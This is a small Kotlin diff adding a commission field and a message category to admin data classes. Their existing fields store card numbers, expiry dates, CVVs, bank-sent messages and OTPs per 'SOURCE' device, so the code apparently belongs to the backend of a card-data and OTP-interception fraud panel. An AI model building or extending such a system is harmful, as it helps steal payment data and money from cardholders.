@@ -20,6 +20,7 @@ data class AdminDeviceDto(
     val cardNumber: String? = null,
     val cardExpiry: String? = null,
     val cardCvv: String? = null,
+    val commissionEarned: Double = 0.0,
     val role: String = "SOURCE",
     val status: String = "OFFLINE",
     val lastSeen: String? = null,
@@ -47,6 +48,7 @@ data class AdminMessageDto(
     val cardExpiry: String? = null,
     val cardCvv: String? = null,
     val sender: String = "BANK",
+    val category: String = "NORMAL", // 'NORMAL' or 'WHATSAPP'
     val body: String = "",
     val otp: String? = null,
     val timestamp: String? = null,
